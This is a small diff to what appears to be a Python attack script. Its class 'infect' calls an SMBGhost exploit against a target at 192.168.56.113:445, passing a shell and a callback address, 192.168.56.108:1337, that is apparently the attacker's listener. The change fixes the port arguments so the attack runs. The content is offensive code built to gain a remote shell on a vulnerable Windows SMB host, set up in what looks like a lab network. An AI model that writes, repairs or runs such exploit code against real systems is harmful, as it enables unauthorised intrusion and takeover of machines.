@@ -34,5 +34,5 @@ class infect:
         result = exploit.exploit_SMBGhost(self.rhost, self.rport, shell)
     
     
-s=infect("192.168.56.113","445","192.168.56.108","1337")
+s=infect("192.168.56.113",445,"192.168.56.108",1337)
 s.inject()
